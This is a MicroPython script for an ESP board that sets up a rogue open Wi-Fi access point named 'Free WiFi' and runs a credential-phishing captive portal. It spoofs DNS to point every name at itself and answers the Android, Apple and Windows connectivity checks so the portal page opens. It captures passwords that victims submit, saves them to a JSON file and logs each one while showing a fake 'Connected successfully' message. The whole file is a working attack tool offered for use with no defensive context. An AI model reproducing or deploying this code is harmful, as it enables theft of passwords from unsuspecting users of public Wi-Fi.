import network
import esp
import socket
import time
import _thread
import json

STORAGE_FILE = "passwords.json"

def load_passwords():
    try:
        with open(STORAGE_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_passwords(passwords):
    try:
        with open(STORAGE_FILE, 'w') as f:
            json.dump(passwords, f)
        return True
    except Exception as e:
        print("[!] Save error:", e)
        return False

users = load_passwords()
print("[+] Loaded {} passwords from storage".format(len(users)))

# Configure your AP settings here
AP_SSID = "Free WiFi"
AP_PASSWORD = ""  # Leave empty for open network

ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(
    essid=AP_SSID,
    authmode=network.AUTH_OPEN,
    txpower=20
)

print("[+] AP started:", ap.ifconfig())

def dns_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", 53))
    my_ip = ap.ifconfig()[0]
    
    while True:
        try:
            data, addr = s.recvfrom(512)
            if len(data) > 12:
                response = data[:2]
                response += b'\x81\x80'
                response += data[4:6]
                response += data[4:6]
                response += b'\x00\x00\x00\x00'
                response += data[12:]
                response += b'\xc0\x0c'
                response += b'\x00\x01'
                response += b'\x00\x01'
                response += b'\x00\x00\x00\x3c'
                response += b'\x00\x04'
                response += bytes(map(int, my_ip.split('.')))
                s.sendto(response, addr)
        except Exception as e:
            print("[!] DNS error:", e)
            time.sleep(0.1)

_thread.start_new_thread(dns_server, ())

PORTAL_HTML = """\
HTTP/1.1 200 OK\r
Content-Type: text/html\r
Cache-Control: no-cache, no-store, must-revalidate\r
Connection: close\r
\r
<!DOCTYPE html>
<html lang="en">
<html>

# Custom HTML 

</html>
"""

GENERATE_204 = b"HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n"
REDIRECT_RESPONSE = b"HTTP/1.1 302 Found\r\nLocation: http://192.168.4.1/\r\nConnection: close\r\n\r\n"

def response(msg):
    return "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n" + msg

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 80))
s.listen(5)

print("[+] HTTP server started")

while True:
    try:
        conn, addr = s.accept()
        conn.settimeout(3.0)
        req = conn.recv(2048).decode('utf-8', 'ignore')

        if "generate_204" in req:
            conn.send(REDIRECT_RESPONSE)
        elif "hotspot-detect.html" in req or "captive.apple.com" in req:
            conn.send(PORTAL_HTML.encode())
        elif "ncsi.txt" in req or "msftconnecttest.com" in req:
            conn.send(REDIRECT_RESPONSE)
        elif "success.txt" in req or "connectivitycheck" in req:
            conn.send(REDIRECT_RESPONSE)
        elif "POST /submit" in req:
            try:
                body = req.split("\r\n\r\n")[1]
                password = body.split("=")[1] if "=" in body else ""
                password = password.replace("+", " ").replace("%40", "@")
                i = 0
                decoded = ""
                while i < len(password):
                    if password[i] == '%' and i + 2 < len(password):
                        decoded += chr(int(password[i+1:i+3], 16))
                        i += 3
                    else:
                        decoded += password[i]
                        i += 1
                password = decoded
            except Exception:
                password = ""

            if not password:
                conn.send(response("<h3>Invalid input</h3>").encode())
            elif password in users:
                conn.send(response("<h3>Already Used</h3><p>Password already submitted.</p>").encode())
            else:
                users[password] = True
                save_passwords(users)
                print("[+] New password collected: {}".format(password))
                conn.send(response("<h3>Success</h3><p>Connected successfully.</p>").encode())
        else:
            conn.send(PORTAL_HTML.encode())

        conn.close()
    except Exception:
        try:
            conn.close()
        except:
            pass
